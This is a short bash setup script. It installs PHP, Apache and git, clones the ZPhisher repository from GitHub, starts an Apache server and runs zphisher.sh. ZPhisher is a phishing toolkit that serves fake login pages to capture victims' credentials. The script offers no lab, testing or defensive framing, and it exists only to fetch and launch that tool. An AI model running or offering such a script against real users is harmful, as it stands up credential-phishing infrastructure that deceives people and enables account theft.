#!/bin/bash

# Install dependencies
apt-get update
apt-get install -y php apache2 git

# Clone the ZPhisher repository
git clone https://github.com/htr-tech/zphisher.git
cd zphisher

# Start the Apache server
service apache2 start

# Run the ZPhisher script
./zphisher.sh